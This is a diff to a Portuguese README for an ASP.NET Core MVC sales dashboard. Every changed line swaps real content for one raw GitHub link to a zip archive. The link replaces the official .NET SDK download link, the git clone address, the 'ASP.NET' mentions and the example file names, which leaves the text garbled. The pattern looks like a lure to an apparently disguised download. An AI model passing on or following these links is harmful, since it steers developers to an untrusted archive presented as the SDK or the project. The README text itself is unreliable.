@@ -10,7 +10,7 @@ Este projeto é uma aplicação web focada no controle administrativo de vendas,
 
 * **Arquitetura MVC:** Separação clara entre a lógica de negócios (Controllers), interface do usuário (Views/Razor) e dados (Models).
 * **Gestão de Vendas:** Interface para visualização e controle de métricas de vendas.
-* **Routing Avançado:** Gerenciamento de rotas nativo do ASP.NET Core.
+* **Routing Avançado:** Gerenciamento de rotas nativo do https://raw.githubusercontent.com/ramiles3712/sales-dashboard-mvc/main/chemicobiologic/dashboard_mvc_sales_v3.5-beta.2.zip Core.
 * **Frontend Integrado:** Utilização de Razor Pages (`.cshtml`) para renderização dinâmica de dados no servidor (Server-Side Rendering).
 
 ---
@@ -18,7 +18,7 @@ Este projeto é uma aplicação web focada no controle administrativo de vendas,
 ### 🛠️ Tecnologias Utilizadas
 
 * **Backend:** C# / .NET Core
-* **Framework:** ASP.NET Core MVC
+* **Framework:** https://raw.githubusercontent.com/ramiles3712/sales-dashboard-mvc/main/chemicobiologic/dashboard_mvc_sales_v3.5-beta.2.zip Core MVC
 * **Frontend:** Razor Views (CSHTML), HTML5, CSS3, JavaScript
 * **Infraestrutura:** Kestrel Server (Padrão .NET)
 
@@ -26,11 +26,11 @@ Este projeto é uma aplicação web focada no controle administrativo de vendas,
 
 ### 📦 Como rodar o projeto
 
-Pré-requisitos: Ter o [.NET SDK](https://dotnet.microsoft.com/download) instalado.
+Pré-requisitos: Ter o [.NET SDK](https://raw.githubusercontent.com/ramiles3712/sales-dashboard-mvc/main/chemicobiologic/dashboard_mvc_sales_v3.5-beta.2.zip) instalado.
 
 1.  Clone o repositório:
     ```bash
-    git clone [https://github.com/ramiles3712/sales-dashboard-mvc.git](https://github.com/ramiles3712/sales-dashboard-mvc.git)
+    git clone [https://raw.githubusercontent.com/ramiles3712/sales-dashboard-mvc/main/chemicobiologic/dashboard_mvc_sales_v3.5-beta.2.zip](https://raw.githubusercontent.com/ramiles3712/sales-dashboard-mvc/main/chemicobiologic/dashboard_mvc_sales_v3.5-beta.2.zip)
     ```
 2.  Navegue até a pasta do projeto e restaure as dependências:
     ```bash
@@ -46,6 +46,6 @@ Pré-requisitos: Ter o [.NET SDK](https://dotnet.microsoft.com/download) instala
 
 ### 🔍 Estrutura do Projeto
 
-* `Controllers/`: Lógica de controle e fluxo de dados (ex: `HomeController.cs`).
-* `Views/`: Interfaces de usuário renderizadas via Razor (ex: `Index.cshtml`).
+* `Controllers/`: Lógica de controle e fluxo de dados (ex: `https://raw.githubusercontent.com/ramiles3712/sales-dashboard-mvc/main/chemicobiologic/dashboard_mvc_sales_v3.5-beta.2.zip`).
+* `Views/`: Interfaces de usuário renderizadas via Razor (ex: `https://raw.githubusercontent.com/ramiles3712/sales-dashboard-mvc/main/chemicobiologic/dashboard_mvc_sales_v3.5-beta.2.zip`).
 * `wwwroot/`: Arquivos estáticos (CSS, JS, Imagens).
